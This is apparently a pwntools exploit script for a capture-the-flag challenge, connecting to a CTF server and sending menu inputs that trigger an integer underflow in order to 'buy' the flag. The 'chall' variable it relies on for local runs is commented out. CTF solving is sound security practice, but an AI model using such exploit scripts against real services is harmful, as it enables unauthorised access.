#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

#chall = "./chall"
#libc = ELF("./libc.so.6")
#elf = ELF(chall)
#context.binary = chall
#context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("challs.n00bzunit3d.xyz", 50267)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b main
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

# Underflow
p.sendlineafter("[3]", '2')
p.sendlineafter('?', '4')
# Buy real flag
p.sendlineafter("[3]", '1')
p.sendlineafter('?', '1')


p.interactive()
